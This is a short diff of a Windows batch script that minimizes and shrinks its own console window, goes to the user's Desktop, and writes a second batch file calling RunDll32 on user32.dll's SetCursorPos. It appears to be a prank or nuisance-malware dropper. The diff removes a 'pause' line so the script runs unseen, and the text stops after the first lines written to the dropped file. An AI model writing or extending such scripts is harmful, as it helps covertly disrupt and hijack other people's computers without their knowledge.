@@ -1,7 +1,6 @@
 @echo off
 powershell -window minimized -command "" 
 mode 30 , 01
-pause
 cd C:\Users\%username%\Desktop
 echo @echo off >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
